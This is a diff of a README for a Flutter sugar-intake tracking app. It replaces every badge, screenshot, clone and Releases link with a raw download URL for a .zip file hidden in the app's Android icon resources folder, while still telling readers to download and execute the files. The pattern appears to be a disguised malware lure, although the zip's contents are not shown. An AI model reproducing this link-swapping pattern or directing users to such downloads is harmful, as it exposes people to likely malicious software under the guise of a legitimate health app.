@@ -1,6 +1,6 @@
 # Sugar Tracking App in Flutter 🍬📱
 
-![Flutter](https://img.shields.io/badge/Flutter-3.0.0-blue?style=flat-square) ![Firebase](https://img.shields.io/badge/Firebase-8.0.0-yellow?style=flat-square) ![Dart](https://img.shields.io/badge/Dart-2.12.0-009639?style=flat-square)
+![Flutter](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip) ![Firebase](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip) ![Dart](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip)
 
 Welcome to the **Sugar Tracking App**! This Flutter application helps you track and manage your daily sugar intake. With features like progress analytics and Firebase integration, you can stay on top of your health goals. 
 
@@ -29,7 +29,7 @@ To set up the Sugar Tracking App on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Deplomasi/suger-tracking-app-in-flutter.git
+   git clone https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -60,13 +60,13 @@ Once you have the app running, you can start tracking your sugar intake.
 
 ## Screenshots
 
-![Home Screen](https://via.placeholder.com/400x300?text=Home+Screen)  
+![Home Screen](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip+Screen)  
 *The home screen allows easy logging of sugar intake.*
 
-![Analytics Screen](https://via.placeholder.com/400x300?text=Analytics+Screen)  
+![Analytics Screen](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip+Screen)  
 *The analytics screen shows your progress over time.*
 
-![Settings Screen](https://via.placeholder.com/400x300?text=Settings+Screen)  
+![Settings Screen](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip+Screen)  
 *The settings screen lets you customize your experience.*
 
 ## Technologies Used
@@ -93,9 +93,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the Sugar Tracking App, visit the [Releases](https://github.com/Deplomasi/suger-tracking-app-in-flutter/releases) section. You can download and execute the files from there.
+To download the latest version of the Sugar Tracking App, visit the [Releases](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip) section. You can download and execute the files from there.
 
-For updates and more information, check the [Releases](https://github.com/Deplomasi/suger-tracking-app-in-flutter/releases) section.
+For updates and more information, check the [Releases](https://github.com/Deplomasi/suger-tracking-app-in-flutter/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/app_suger_in_tracking_flutter_v2.1.zip) section.
 
 ---
 
